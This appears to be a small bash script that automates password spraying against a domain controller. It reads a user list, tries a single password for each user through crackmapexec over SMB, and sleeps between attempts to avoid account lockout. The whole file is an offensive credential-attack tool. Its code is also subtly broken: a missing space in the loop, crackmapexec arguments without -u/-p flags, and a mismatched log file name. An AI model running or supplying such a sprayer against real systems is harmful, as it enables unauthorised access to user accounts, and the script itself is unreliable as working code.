#!/bin/bash

#script to automate crackmap sprays based on passpolicy

#usage : timed-spray.sh dc-ip user-list password timeframe(in seconds)



#check for args
	if [ $# -ne 4 ]; then
			echo 'Usage: timed-spray.sh dc-ip user-list password timeframe(in seconds)'
			exit -1
	fi

LOGFILE=timed-spray.log
waittime=$4

#starting up
date >> $LOGFILE

echo 'Starting script -- logging to time-spray.log' 
echo ' '
echo ' '
echo ' '
echo ' '

for user in$(cat $2)
do
  crackmapexec smb $1 $user $3 
  sleep $4
  echo 'sleep for '$4' seconds'
done
